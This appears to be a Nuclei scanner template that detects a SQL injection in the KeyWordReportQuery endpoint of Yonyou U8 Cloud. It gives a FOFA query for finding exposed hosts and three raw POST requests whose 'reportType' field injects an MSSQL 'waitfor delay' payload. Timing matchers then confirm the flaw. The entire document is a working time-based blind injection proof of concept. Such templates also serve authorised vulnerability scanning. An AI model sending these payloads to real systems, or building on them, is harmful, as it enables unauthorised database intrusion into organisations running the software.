id: yonyou-u8cloud-keywordreportquery-sqli
 
info:
  name: 用友-U8C-KeyWordReportQuery-sql注入
  author: Abbbbb
  severity: critical
  metadata:
    fofa-query: app="用友-U8-Cloud" || body="/api/uclient/public/"
 
http:
  - raw:
      - |+
        POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        
        {"reportType":"1';waitfor delay '0:0:2'-- ","pageInfo":{"currentPageIndex":1,"pageSize":1},"keyword":[]}
      - |+
        POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        
        {"reportType":"1';waitfor delay '0:0:4'-- ","pageInfo":{"currentPageIndex":1,"pageSize":1},"keyword":[]}
      - |+
        POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        
        {"reportType":"1';waitfor delay '0:0:6'-- ","pageInfo":{"currentPageIndex":1,"pageSize":1},"keyword":[]}
 
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>2 && duration_1<4"
          - "duration_2>2 && duration_2<6"
          - "duration_3>6 && duration_3<9"